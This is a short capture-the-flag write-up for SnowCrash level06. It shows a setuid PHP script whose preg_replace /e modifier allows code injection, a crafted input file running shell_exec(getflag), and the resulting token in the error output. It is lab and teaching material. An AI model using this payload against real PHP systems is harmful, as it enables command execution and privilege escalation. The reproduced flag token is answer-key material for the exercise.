We start this one with 2 files in the home directory:

- level06
- level06.php

```php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Moreover, those files have the following rights:

```bash
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

The php script get executed by the binary one.

The first preg_replace from the `function x(...)` contain the `execution flag` (the trailing 'e' in the regex).

So my intuition is that we can execute the `getflag` command when this regex get parsed.

```bash
echo '[x {${shell_exec(getflag)}}]' > /tmp/level06-file1
```

```bash
level06@SnowCrash:~$ ./level06 /tmp/level06-file1
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

As simple as this. We inject a shell command through PHP.

The token appears in errors.
